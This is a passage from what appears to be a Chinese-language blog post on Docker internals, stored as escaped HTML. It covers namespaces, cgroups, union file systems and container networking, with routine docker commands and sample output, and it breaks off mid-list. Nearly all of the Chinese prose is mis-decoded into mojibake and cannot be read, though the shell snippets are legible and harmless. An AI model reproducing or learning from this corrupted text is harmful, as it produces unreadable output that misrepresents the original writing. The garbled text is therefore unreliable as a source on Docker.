&lt;p&gt;æ­¤å‘½ä»¤å¯ä»¥åˆ›å»ºå¹¶å¯åŠ¨ä¸€ä¸ªubantuå®¹å™¨ï¼Œå®ƒå°†æ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;å¦‚æœæœ¬åœ°æ²¡æœ‰ubantué•œåƒï¼Œdockerå°†ä¼šä»registryä¸­ä¸‹è½½ä¸€ä¸ªubantué•œåƒï¼Œå’Œæ‰§è¡Œ&lt;code&gt;docker pull ubantu&lt;/code&gt;å‘½ä»¤ä¸€æ ·ï¼›&lt;/li&gt;
&lt;li&gt;åˆ›å»ºä¸€ä¸ªå®¹å™¨ï¼Œå’Œæ‰§è¡Œ&lt;code&gt;docker container create&lt;/code&gt;å‘½ä»¤ä¸€æ ·ï¼›&lt;/li&gt;
&lt;li&gt;dockerä¸ºå®¹å™¨ç”³è¯·ä¸€ä¸ªå¯è¯»å†™æ–‡ä»¶ç³»ç»Ÿï¼Œä½œä¸ºæœ€åä¸€å±‚ï¼Œè¿™å¯ä»¥è®©è¿è¡Œä¸­çš„å®¹å™¨åœ¨å…¶æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿä¸­åˆ›å»ºæˆ–ä¿®æ”¹æ–‡ä»¶å’Œç›®å½•ã€‚&lt;/li&gt;
&lt;li&gt;ç”±äºæ²¡æœ‰æŒ‡å®šä»»ä½•ç½‘ç»œæ“ä½œï¼Œdockerä¼šåˆ›å»ºä¸€ä¸ªç½‘ç»œæ¥å£å°†å®¹å™¨è¿æ¥åˆ°é»˜è®¤ç½‘ç»œï¼ŒåŒ…æ‹¬ä¸ºå®¹å™¨æŒ‡å®šIPï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œå®¹å™¨å¯ä»¥é€šè¿‡å®¿ä¸»æœºç½‘ç»œè¿æ¥åˆ°å¤–éƒ¨ç½‘ç»œã€‚&lt;/li&gt;
&lt;li&gt;dockerå¯åŠ¨å®¹å™¨å¹¶æ‰§è¡Œ/bin/bashã€‚&lt;code&gt;-i -t&lt;/code&gt;çš„æ„æ€æ˜¯ä»¥äº¤äº’çš„æ–¹å¼è¿è¡Œå®¹å™¨å¹¶è¿æ¥åˆ°å½“å‰ç»ˆç«¯ï¼Œå¯ä»¥é€šè¿‡å½“å‰ç»ˆç«¯è¾“å…¥ã€‚&lt;/li&gt;
&lt;li&gt;å½“è¾“å…¥&lt;code&gt;exit&lt;/code&gt;åˆ°&lt;code&gt;/bin/bash&lt;/code&gt;ï¼Œå®¹å™¨å°†ä¼šåœæ­¢ä½†ä¸ä¼šåˆ é™¤ã€‚å¯ä»¥å†æ¬¡å¯åŠ¨æˆ–åˆ é™¤ã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;dockeræ ¸å¿ƒæ¦‚å¿µ&#34;&gt;Dockeræ ¸å¿ƒæ¦‚å¿µ&lt;/h2&gt;
&lt;h3 id=&#34;namespace&#34;&gt;namespace&lt;/h3&gt;
&lt;p&gt;å‘½åç©ºé—´æ˜¯linuxå®ç°å®¹å™¨è™šæ‹ŸåŒ–å¼•å…¥çš„ç‰¹æ€§ã€‚åˆ›å»ºå®¹å™¨æ—¶ï¼Œdockerä¸ºå…¶åˆ›å»ºä¸€ç»„å‘½åç©ºé—´ã€‚æ¯ä¸ªå®¹å™¨éƒ½å¯ä»¥æ‹¥æœ‰è‡ªå·±å•ç‹¬çš„å‘½åç©ºé—´ï¼Œè¿è¡Œåœ¨å…¶ä¸­çš„åº”ç”¨éƒ½åƒæ˜¯åœ¨ç‹¬ç«‹çš„æ“ä½œç³»ç»Ÿä¸­è¿è¡Œä¸€æ ·ï¼Œä¿è¯äº†å®¹å™¨ä¹‹é—´å½¼æ­¤äº’ä¸å½±å“ã€‚&lt;/p&gt;
&lt;p&gt;åœ¨æ“ä½œç³»ç»Ÿä¸­ï¼ŒåŒ…æ‹¬å†…æ ¸ã€æ–‡ä»¶ç³»ç»Ÿã€ç½‘ç»œã€PIDã€UIDã€IPCã€å†…å­˜ã€ç¡¬ç›˜ã€CPUç­‰èµ„æºéƒ½æ˜¯åº”ç”¨è¿›ç¨‹ç›´æ¥å…±äº«çš„ã€‚è¦å®ç°è™šæ‹ŸåŒ–ï¼Œé™¤äº†è¦å®ç°å¯¹å†…å­˜ã€CPUã€ç½‘ç»œIOã€ç¡¬ç›˜IOã€å­˜å‚¨ç©ºé—´ç­‰çš„é™åˆ¶å¤–ï¼Œè¿˜éœ€è¦å®ç°æ–‡ä»¶ç³»ç»Ÿã€ç½‘ç»œã€PIDã€UIDã€IPCç­‰çš„ç›¸äº’éš”ç¦»ã€‚å‰è€…å®¹æ˜“å®ç°ï¼Œè€Œåè€…éœ€è¦å®¿ä¸»æœºç³»ç»Ÿçš„æ·±å…¥æ”¯æŒã€‚&lt;/p&gt;
&lt;p&gt;è€Œlinuxçš„å‘½åç©ºé—´åŠŸèƒ½å¯ä»¥æ”¯æŒå®ç°ä¸Šè¿°çš„éœ€æ±‚ã€‚&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;è¿›ç¨‹å‘½åç©ºé—´&lt;br&gt;
linuxé€šè¿‡å‘½åç©ºé—´ç®¡ç†è¿›ç¨‹å·ï¼Œå¯¹äºåŒä¸€è¿›ç¨‹(åŒä¸€ä¸ªtask_struct)ï¼Œåœ¨ä¸åŒçš„å‘½åç©ºé—´ä¸­ï¼Œçœ‹åˆ°çš„è¿›ç¨‹å·ä¸ç›¸åŒï¼Œæ¯ä¸ªè¿›ç¨‹å‘½åç©ºé—´æœ‰ä¸€å¥—è‡ªå·±çš„è¿›ç¨‹å·ç®¡ç†æ–¹æ³•ã€‚è¿›ç¨‹å‘½åç©ºé—´æ˜¯ä¸€ä¸ªçˆ¶å­å…³ç³»çš„ç»“æ„ï¼Œå­ç©ºé—´ä¸­çš„è¿›ç¨‹å¯¹äºçˆ¶ç©ºé—´æ˜¯å¯è§çš„ã€‚æ–°forkå‡ºçš„è¿›ç¨‹åœ¨çˆ¶å‘½åç©ºé—´å’Œå­å‘½åç©ºé—´å°†åˆ†åˆ«æœ‰ä¸€ä¸ªè¿›ç¨‹å·æ¥å¯¹åº”&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;# ä¾‹å¦‚æŸ¥çœ‹Dockerä¸»è¿›ç¨‹çš„pidçš„è¿›ç¨‹å·æ˜¯10751
docker ps |grep docker
root      10751      1  0 Feb02 ?        00:00:30 /usr/bin/dockerd-current --add-runtime docker-runc=/usr/libexec/docker/docker-runc-current --default-runtime=docker-runc --exec-opt native.cgroupdriver=systemd --userland-proxy-path=/usr/libexec/docker/docker-proxy-current --init-path=/usr/libexec/docker/docker-init-current --seccomp-profile=/etc/docker/seccomp.json --selinux-enabled --log-driver=journald --signature-verification=false --storage-driver overlay2
# pid=1æ˜¯initè¿›ç¨‹ï¼Œå…¶ä»–æ‰€æœ‰è¿›ç¨‹æœ€åˆéƒ½æœ‰å®ƒç®¡ç†äº§ç”Ÿ


# æ–°å»ºä¸€ä¸ªmysqlå®¹å™¨
docker run -itd -p 3306:3306 -e MYSQL_ROOT_PASSWORD=123456 --name mysql-latest mysql

docker ps |grep docker
root      10751      1  0 Feb02 ?        00:00:33 /usr/bin/dockerd-current --add-runtime docker-runc=/usr/libexec/docker/docker-runc-current --default-runtime=docker-runc --exec-opt native.cgroupdriver=systemd --userland-proxy-path=/usr/libexec/docker/docker-proxy-current --init-path=/usr/libexec/docker/docker-init-current --seccomp-profile=/etc/docker/seccomp.json --selinux-enabled --log-driver=journald --signature-verification=false --storage-driver overlay2
root      13159  10751  0 02:44 ?        00:00:00 /usr/libexec/docker/docker-proxy-current -proto tcp -host-ip 0.0.0.0 -host-port 3306 -container-ip 172.17.0.2 -container-port 3306
# æŸ¥çœ‹æ–°å»ºå®¹å™¨è¿›ç¨‹çš„çˆ¶å®¹å™¨ï¼Œæ­£æ˜¯Dockerä¸»è¿›ç¨‹10751
&lt;/code&gt;&lt;/pre&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;
&lt;p&gt;ç½‘ç»œå‘½åç©ºé—´&lt;br&gt;
ä¸€ä¸ªç½‘ç»œå‘½åç©ºé—´ä¸ºè¿›ç¨‹æä¾›äº†ä¸€ä¸ªå®Œå…¨ç‹¬ç«‹çš„ç½‘ç»œåè®®æ ˆçš„è§†å›¾ï¼ŒåŒ…æ‹¬ç½‘ç»œè®¾å¤‡æ¥å£ã€IPv4å’ŒIPv6åè®®æ ˆã€IPè·¯ç”±è¡¨ã€é˜²ç«å¢™è§„åˆ™ï¼Œsocketsç­‰ã€‚è¿™æ ·æ¯ä¸ªå®¹å™¨çš„ç½‘ç»œå°±èƒ½éš”ç¦»å¼€æ¥ã€‚Dockeré‡‡ç”¨è™šæ‹Ÿç½‘ç»œè®¾å¤‡çš„æ–¹å¼ï¼Œå°†ä¸åŒå‘½åç©ºé—´çš„ç½‘ç»œè®¾å¤‡è¿æ¥åˆ°ä¸€èµ·ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œå®¹å™¨ä¸­è™šæ‹Ÿç½‘å¡å°†æœ¬åœ°ä¸»æœºä¸Šçš„docker0ç½‘æ¡¥è¿æ¥åœ¨ä¸€èµ·ã€‚&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1644538184128.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;IPCå‘½åç©ºé—´&lt;br&gt;
å®¹å™¨ä¸­è¿›ç¨‹äº¤äº’è¿˜æ˜¯é‡‡ç”¨äº†linuxå¸¸è§çš„è¿›ç¨‹é—´äº¤äº’æ–¹æ³•ï¼ŒåŒ…æ‹¬ä¿¡å·é‡ã€æ¶ˆæ¯é˜Ÿåˆ—å’Œå…±äº«å†…å­˜ç­‰ã€‚PIDå‘½åç©ºé—´å’ŒIPCå‘½åç©ºé—´å¯ä»¥ç»„åˆèµ·æ¥ä¸€èµ·ä½¿ç”¨ï¼ŒåŒä¸€ä¸ªIPCåå­—ç©ºé—´å†…çš„è¿›ç¨‹å¯ä»¥å½¼æ­¤å¯è§ï¼Œå…è®¸è¿›è¡Œäº¤äº’ï¼Œä¸åŒç©ºé—´çš„è¿›ç¨‹åˆ™æ— æ³•äº¤äº’ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;æŒ‚è½½å‘½åç©ºé—´&lt;br&gt;
ç±»ä¼¼chrootï¼Œå°†ä¸€ä¸ªè¿›ç¨‹æ–¹åˆ°ä¸€ä¸ªç‰¹å®šçš„ç›®å½•æ‰§è¡Œã€‚æŒ‚è½½å‘½åç©ºé—´å…è®¸ä¸åŒå‘½åç©ºé—´çš„è¿›ç¨‹çœ‹åˆ°æ–‡ä»¶ç»“æ„ä¸åŒï¼Œè¿™æ ·æ¯ä¸ªå‘½åç©ºé—´ä¸­çš„è¿›ç¨‹æ‰€çœ‹åˆ°çš„æ–‡ä»¶ç›®å½•å½¼æ­¤è¢«éš”ç¦»ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;UTSå‘½åç©ºé—´&lt;br&gt;
UTS(UNIX Time-sharing System)å‘½åç©ºé—´å…è®¸æ¯ä¸ªå®¹å™¨æ‹¥æœ‰ç‹¬ç«‹çš„ä¸»æœºåå’ŒåŸŸåï¼Œä»è€Œå¯ä»¥è™šæ‹Ÿå‡ºä¸€ä¸ªæœ‰ç‹¬ç«‹ä¸»æœºåå’Œç½‘ç»œç©ºé—´çš„ç¯å¢ƒï¼Œå°±å’Œç½‘ç»œä¸Šä¸€å°ç‹¬ç«‹çš„ä¸»æœºä¸€æ ·ã€‚&lt;br&gt;
é»˜è®¤æƒ…å†µä¸‹ï¼ŒDockerå®¹å™¨çš„ä¸»æœºåå°±æ˜¯è¿”å›çš„å®¹å™¨IDï¼š&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;docker ps
CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                               NAMES
fdd435874ee2        mysql               &amp;quot;docker-entrypoint...&amp;quot;   2 hours ago         Up 15 minutes       0.0.0.0:3306-&amp;gt;3306/tcp, 33060/tcp   mysql-latest
&lt;/code&gt;&lt;/pre&gt;
&lt;ol start=&#34;6&#34;&gt;
&lt;li&gt;ç”¨æˆ·å‘½åç©ºé—´&lt;br&gt;
æ¯ä¸ªå®¹å™¨å¯ä»¥æœ‰ä¸åŒçš„ç”¨æˆ·å’Œç»„idï¼Œä¹Ÿå°±æ˜¯è¯´å¯ä»¥åœ¨å®¹å™¨å†…ä½¿ç”¨ç‰¹å®šçš„å†…éƒ¨ç”¨æˆ·æ‰§è¡Œç¨‹åºï¼Œè€Œéæœ¬åœ°ç³»ç»Ÿä¸Šå­˜åœ¨çš„ç”¨æˆ·ã€‚&lt;br&gt;
æ¯ä¸ªå®¹å™¨å†…éƒ¨éƒ½å¯ä»¥æœ‰rootè´¦å·ï¼Œè·Ÿå®¿ä¸»ä¸»æœºä¸åœ¨ä¸€ä¸ªå‘½åç©ºé—´ã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;æ§åˆ¶ç»„&#34;&gt;æ§åˆ¶ç»„&lt;/h3&gt;
&lt;p&gt;å‘½åç©ºé—´éš”ç¦»è¿è¡Œç¯å¢ƒï¼Œä½¿å¾—å®¹å™¨ä¸­çš„è¿›ç¨‹çœ‹èµ·æ¥è¿˜æƒ³å†åœ°ç†çš„ç¯å¢ƒä¸­è¿è¡Œï¼Œä½†å…‰æœ‰ç¯å¢ƒéš”ç¦»è¿˜ä¸å¤Ÿï¼Œå› ä¸ºè¿™äº›è¿›ç¨‹è¿˜æ˜¯å¯ä»¥ä¸å—é™åˆ¶ä½¿ç”¨ç³»ç»Ÿèµ„æºã€‚ä¸ºäº†é˜²æ­¢è¿›ç¨‹å ç”¨å¤ªå¤šèµ„æºè€Œå½±å“å…¶ä»–è¿›ç¨‹ï¼ŒDockerä½¿ç”¨Cgroupå¯¹å®¹å™¨ä¸­çš„è¿›ç¨‹åšé™åˆ¶ï¼Œå°±æ˜¯é™åˆ¶è¿›ç¨‹ç»„ä½¿ç”¨çš„èµ„æºä¸Šé™ï¼ŒåŒ…æ‹¬ CPUï¼Œå†…å­˜ï¼Œç£ç›˜ï¼Œç½‘ç»œå¸¦å®½ã€‚&lt;/p&gt;
&lt;p&gt;æ§åˆ¶ç»„(CGroups)æ˜¯Linuxå†…æ ¸çš„ä¸€ä¸ªç‰¹æ€§ï¼Œä¸»è¦ç”¨æ¥å¯¹å…±äº«èµ„æºè¿›è¡Œéš”ç¦»ã€é™åˆ¶ã€å®¡è®¡ç­‰ã€‚åªæœ‰èƒ½æ§åˆ¶åˆ†é…åˆ°å®¹å™¨çš„èµ„æºï¼ŒDockeræ‰èƒ½é¿å…å¤šä¸ªå®¹å™¨åŒæ—¶è¿è¡Œæ—¶çš„ç³»ç»Ÿèµ„æºç«äº‰ã€‚&lt;br&gt;
æ§åˆ¶ç»„çš„è®¾è®¡ç›®æ ‡æ˜¯ä¸ºä¸åŒçš„åº”ç”¨æƒ…å†µæä¾›ç»Ÿä¸€æ¥å£ï¼Œä»æ§åˆ¶å•ä¸€è¿›ç¨‹åˆ°ç³»ç»Ÿçº§è™šæ‹ŸåŒ–ã€‚&lt;br&gt;
å…·ä½“æ¥çœ‹ï¼Œæ§åˆ¶ç»„æä¾›ä¸€ä¸‹åŠŸèƒ½ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;èµ„æºé™åˆ¶ï¼šç»„å¯ä»¥è®¾ç½®ä¸ºä¸è¶…è¿‡è®¾å®šçš„å†…å­˜é™åˆ¶ã€‚&lt;/li&gt;
&lt;li&gt;ä¼˜å…ˆçº§ï¼šé€šè¿‡ä¼˜å…ˆçº§è®©ä¸€äº›ç»„ä¼˜å…ˆå¾—åˆ°æ›´å¤šçš„CPUç­‰èµ„æºã€‚&lt;/li&gt;
&lt;li&gt;èµ„æºå®¡è®¡ï¼šç”¨æ¥ç»Ÿè®¡ç³»ç»Ÿå®é™…ä¸ŠæŠŠå¤šå°‘èµ„æºç”¨åˆ°é€‚åˆçš„ç›®çš„ä¸Šï¼Œå¯ä»¥ä½¿ç”¨cpuacctå­ç³»ç»Ÿè®°å½•æŸä¸ªè¿›ç¨‹ç»„ä½¿ç”¨çš„CPUæ—¶é—´ã€‚&lt;/li&gt;
&lt;li&gt;éš”ç¦»ï¼šä¸ºç»„éš”ç¦»åå­—ç©ºé—´ï¼Œè¿™æ ·ä¸€ä¸ªç»„ä¸ä¼šçœ‹åˆ°å¦ä¸€ä¸ªç»„çš„è¿›ç¨‹ã€ç½‘ç»œè¿æ¥å’Œæ–‡ä»¶ç³»ç»Ÿã€‚&lt;/li&gt;
&lt;li&gt;æ§åˆ¶ï¼šæŒ‚èµ·ã€æ¢å¤å’Œé‡å¯åŠ¨ç­‰æ“ä½œã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;å®‰è£…Dockeråå¯ä»¥åœ¨/sys/fs/cgroup/memory/docker/ç›®å½•ä¸‹çœ‹åˆ°å¯¹Dockerç»„åº”ç”¨çš„å„ç§é™åˆ¶é¡¹ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ls /sys/fs/cgroup/memory/docker
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;è”åˆæ–‡ä»¶ç³»ç»Ÿ&#34;&gt;è”åˆæ–‡ä»¶ç³»ç»Ÿ&lt;/h3&gt;
&lt;p&gt;åœ¨å®¹å™¨å†…ï¼Œåº”è¯¥çœ‹åˆ°å®Œå…¨ç‹¬ç«‹çš„æ–‡ä»¶ç³»ç»Ÿï¼Œè€Œä¸”ä¸ä¼šå—åˆ°å®¿ä¸»æœºä»¥åŠå…¶ä»–å®¹å™¨çš„å½±å“ã€‚è¿™ä¸ªç‹¬ç«‹çš„æ–‡ä»¶ç³»ç»Ÿï¼Œå°±å«åšå®¹å™¨é•œåƒã€‚å®ƒè¿˜æœ‰ä¸€ä¸ªæ›´ä¸“ä¸šçš„åå­—å« rootfs.rootfs ä¸­åŒ…å«äº†ä¸€ä¸ªæ“ä½œç³»ç»Ÿæ‰€éœ€è¦çš„æ–‡ä»¶ï¼Œé…ç½®å’Œç›®å½•ï¼Œä½†å¹¶ä¸åŒ…å«ç³»ç»Ÿå†…æ ¸ã€‚å› ä¸ºåœ¨ Linux ä¸­ï¼Œæ–‡ä»¶å’Œå†…æ ¸æ˜¯åˆ†å¼€å­˜æ”¾çš„ï¼Œæ“ä½œç³»ç»Ÿåªæœ‰åœ¨å¼€å¯å¯åŠ¨æ—¶æ‰ä¼šåŠ è½½æŒ‡å®šçš„å†…æ ¸ã€‚è¿™ä¹Ÿå°±æ„å‘³ç€ï¼Œæ‰€æœ‰çš„å®¹å™¨éƒ½ä¼šå…±äº«å®¿ä¸»æœºä¸Šæ“ä½œç³»ç»Ÿçš„å†…æ ¸ã€‚&lt;br&gt;
åœ¨ PaaS æ—¶ä»£ï¼Œç”±äºäº‘ç«¯å’Œæœ¬åœ°çš„ç¯å¢ƒä¸åŒï¼Œåº”ç”¨æ‰“åŒ…çš„è¿‡ç¨‹ï¼Œä¸€ç›´æ˜¯æ¯”è¾ƒç—›è‹¦çš„è¿‡ç¨‹ã€‚ä½†æœ‰äº† rootfs ï¼Œè¿™ä¸ªé—®é¢˜å°±è¢«å¾ˆå¥½çš„è§£å†³äº†ã€‚å› ä¸ºåœ¨é•œåƒå†…ï¼Œæ‰“åŒ…çš„ä¸ä»…ä»…æ˜¯åº”ç”¨ï¼Œè¿˜æœ‰æ‰€éœ€è¦çš„ä¾èµ–ï¼Œéƒ½è¢«å°è£…åœ¨ä¸€èµ·ã€‚è¿™å°±è§£å†³äº†æ— è®ºæ˜¯åœ¨å“ªï¼Œåº”ç”¨éƒ½å¯ä»¥å¾ˆå¥½çš„è¿è¡Œçš„åŸå› ã€‚&lt;/p&gt;
&lt;p&gt;ä¸å…‰è¿™æ ·ï¼Œrootfs è¿˜è§£å†³äº†å¯é‡ç”¨æ€§çš„é—®é¢˜ï¼Œæƒ³è±¡è¿™ä¸ªåœºæ™¯ï¼Œä½ é€šè¿‡ rootfs æ‰“åŒ…äº†ä¸€ä¸ªåŒ…å« java ç¯å¢ƒçš„ centos é•œåƒï¼Œåˆ«äººéœ€è¦åœ¨å®¹å™¨å†…è·‘ä¸€ä¸ª apache çš„æœåŠ¡ï¼Œé‚£ä¹ˆä»–æ˜¯å¦éœ€è¦ä»å¤´å¼€å§‹æ­å»º java ç¯å¢ƒå‘¢ï¼Ÿdocker åœ¨è§£å†³è¿™ä¸ªé—®é¢˜æ—¶ï¼Œå¼•å…¥äº†ä¸€ä¸ªå«å±‚çš„æ¦‚å¿µï¼Œæ¯æ¬¡é’ˆå¯¹ rootfs çš„ä¿®æ”¹ï¼Œéƒ½åªä¿å­˜å¢é‡çš„å†…å®¹ï¼Œè€Œä¸æ˜¯ fork ä¸€ä¸ªæ–°é•œåƒã€‚&lt;/p&gt;
&lt;p&gt;å³è”åˆæ–‡ä»¶ç³»ç»Ÿæ˜¯ä¸€ä¸ªè½»é‡çº§çš„åˆ†å±‚æ–‡ä»¶ç³»ç»Ÿï¼Œå®ƒæ”¯æŒå°†æ–‡ä»¶ç³»ç»Ÿä¸­çš„ä¿®æ”¹ä¿¡æ¯ä½œä¸ºä¸€æ¬¡æäº¤ï¼Œå¹¶å±‚å±‚å åŠ ï¼ŒåŒæ—¶å¯ä»¥å°†ä¸åŒç›®å½•æŒ‚è½½åˆ°åŒä¸€ä¸ªè™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿä¸‹ã€‚è”åˆæ–‡ä»¶ç³»ç»Ÿæ˜¯å®ç°Dockeré•œåƒçš„æŠ€æœ¯åŸºç¡€ã€‚é•œåƒå¯ä»¥é€šè¿‡åˆ†å±‚æ¥è¿›è¡Œç»§æ‰¿ã€‚ä¾‹å¦‚ï¼Œç”¨æˆ·åŸºäºåŸºç¡€é•œåƒæ¥åˆ¶ä½œå„ç§ä¸åŒçš„åº”ç”¨é•œåƒã€‚è¿™äº›é•œåƒå…±äº«åŒä¸€ä¸ªåŸºç¡€é•œåƒå±‚ï¼Œæé«˜äº†å­˜å‚¨æ•ˆç‡ã€‚æ­¤å¤–ï¼Œå½“ç”¨æˆ·æ”¹å˜äº†ä¸€ä¸ªDockeré•œåƒï¼Œåˆ™ä¸€ä¸ªæ–°çš„å±‚ä¼šåˆ›å»ºã€‚å› æ­¤ï¼Œç”¨æˆ·ä¸ç”¨æ›¿æ¢æ•´ä¸ªåŸé•œåƒæˆ–é‡æ–°å»ºç«‹ï¼Œåªéœ€è¦æ·»åŠ æ–°å±‚å³å¯ã€‚ç”¨æˆ·åˆ†å‘é•œåƒçš„æ—¶å€™ï¼Œä¹Ÿåªéœ€è¦åˆ†å‘è¢«æ”¹åŠ¨çš„æ–°å±‚å†…å®¹ã€‚&lt;/p&gt;
&lt;p&gt;å±‚çº§çš„æƒ³æ³•ï¼ŒåŒæ ·æ¥è‡ªäº Linuxï¼Œä¸€ä¸ªå« union file system ï¼ˆè”åˆæ–‡ä»¶ç³»ç»Ÿï¼‰ã€‚å®ƒæœ€ä¸»è¦çš„åŠŸèƒ½å°±æ˜¯å°†ä¸åŒä½ç½®çš„ç›®å½•è”åˆæŒ‚è½½åˆ°åŒä¸€ä¸ªç›®å½•ä¸‹ã€‚å¯¹åº”åœ¨ Docker é‡Œé¢ï¼Œä¸åŒçš„ç¯å¢ƒåˆ™ä½¿ç”¨äº†ä¸åŒçš„è”åˆæ–‡ä»¶ç³»ç»Ÿã€‚æ¯”å¦‚ centos7 ä¸‹æœ€æ–°çš„ç‰ˆæœ¬ä½¿ç”¨çš„æ˜¯ overlay2ï¼Œè€Œ Ubuntu 16.04 å’Œ Docker CE 18.05 ä½¿ç”¨çš„æ˜¯ AuFS.&lt;/p&gt;
&lt;p&gt;å¯ä»¥é€šè¿‡ docker info æ¥æŸ¥è¯¢ä½¿ç”¨çš„å­˜å‚¨é©±åŠ¨ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;docker info |grep &#39;Storage Driver&#39;
Storage Driver: overlay2
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å½“Dockeråˆ©ç”¨é•œåƒå¯åŠ¨ä¸€ä¸ªå®¹å™¨æ—¶ï¼Œå°†åˆ©ç”¨é•œåƒåˆ†é…æ–‡ä»¶ç³»ç»Ÿå¹¶ä¸”æŒ‚è½½ä¸€ä¸ªæ–°çš„å¯è¯»å†™çš„å±‚ç»™å®¹å™¨ï¼Œå®¹å™¨ä¼šåœ¨è¿™ä¸ªæ–‡ä»¶ç³»ç»Ÿä¸­åˆ›å»ºï¼Œå¹¶ä¸”è¿™ä¸ªå¯è¯»å†™çš„å±‚è¢«æ·»åŠ åˆ°é•œåƒä¸­ã€‚&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1644538202745.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h3 id=&#34;ç½‘ç»œå®ç°&#34;&gt;ç½‘ç»œå®ç°&lt;/h3&gt;
&lt;p&gt;Dockerçš„ç½‘ç»œå®ç°å…¶å®å°±æ˜¯åˆ©ç”¨äº†linuxä¸Šçš„ç½‘ç»œå‘½åç©ºé—´å’Œè™šæ‹Ÿç½‘ç»œè®¾å¤‡ã€‚&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;åŸºæœ¬åŸç†&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;ç›´è§‚ä¸Šçœ‹ï¼Œè¦å®ç°ç½‘ç»œé€šä¿¡ï¼Œæœºå™¨éœ€è¦è‡³å°‘ä¸€ä¸ªç½‘ç»œæ¥å£(ç‰©ç†æˆ–è™šæ‹Ÿæ¥å£)ä¸å¤–ç•Œç›¸åŒï¼Œå¹¶å¯ä»¥æ”¶å‘æ•°æ®åŒ…ï¼›æ­¤å¤–ï¼Œå¦‚æœä¸åŒå­ç½‘ä¹‹é—´è¦è¿›è¡Œé€šä¿¡ï¼Œéœ€è¦é¢å¤–çš„è·¯ç”±æœºåˆ¶ã€‚&lt;/p&gt;
&lt;p&gt;Dockerä¸­çš„ç½‘ç»œæ¥å£é»˜è®¤éƒ½æ˜¯è™šæ‹Ÿæ¥å£ã€‚è™šæ‹Ÿæ¥å£çš„æœ€å¤§ä¼˜åŠ¿å°±æ˜¯è½¬å‘æ•ˆç‡æé«˜ã€‚è¿™æ˜¯å› ä¸ºlinuxé€šè¿‡åœ¨å†…æ ¸ä¸­è¿›è¡Œæ•°æ®å¤åˆ¶æ¥å®ç°è™šæ‹Ÿæ¥å£ä¹‹é—´çš„æ•°æ®è½¬å‘ï¼Œå³å‘é€æ¥å£çš„å‘é€ç¼“å­˜ä¸­çš„æ•°æ®åŒ…å°†è¢«ç›´æ¥å¤åˆ¶åˆ°æ¥æ”¶æ¥å£ç¼“å­˜ä¸­ï¼Œè€Œæ— éœ€é€šè¿‡å¤–éƒ¨ç‰©ç†ç½‘ç»œè®¾å¤‡è¿›è¡Œäº¤æ¢ã€‚å¯¹äºæœ¬åœ°ç³»ç»Ÿå’Œå®¹å™¨å†…ç³»ç»Ÿæ¥çœ‹ï¼Œè™šæ‹Ÿæ¥å£è·Ÿä¸€ä¸ªæ­£å¸¸çš„ä»¥å¤ªç½‘å¡ç›¸æ¯”å¹¶æ— åŒºåˆ«ï¼Œåªæ˜¯å®ƒé€Ÿåº¦å¿«å¾ˆå¤šã€‚&lt;/p&gt;
&lt;p&gt;Dockerå®¹å™¨ç½‘ç»œå°±å¾ˆå¥½åœ°åˆ©ç”¨äº†linuxè™šæ‹Ÿç½‘ç»œæŠ€æœ¯ã€‚å®ƒè®©æœ¬åœ°ä¸»æœºå’Œå®¹å™¨å†…åˆ†åˆ«åˆ›å»ºä¸€ä¸ªè™šæ‹Ÿæ¥å£ï¼Œå¹¶è®©å®ƒä»¬å½¼æ­¤è¿é€šã€‚&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;4&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1644538214687.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;ol&gt;
&lt;li&gt;ç½‘ç»œåˆ›å»ºè¿‡ç¨‹&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Dockeråˆ›å»ºä¸€ä¸ªå®¹å™¨çš„æ—¶å€™ï¼Œä¼šå…·ä½“æ‰§è¡Œå¦‚ä¸‹æ“ä½œï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;åˆ›å»ºä¸€å¯¹è™šæ‹Ÿæ¥å£ï¼Œåˆ†åˆ«æ”¾åˆ°æœ¬åœ°ä¸»æœºå’Œæ–°å®¹å™¨çš„å‘½åç©ºé—´ä¸­ã€‚&lt;/li&gt;
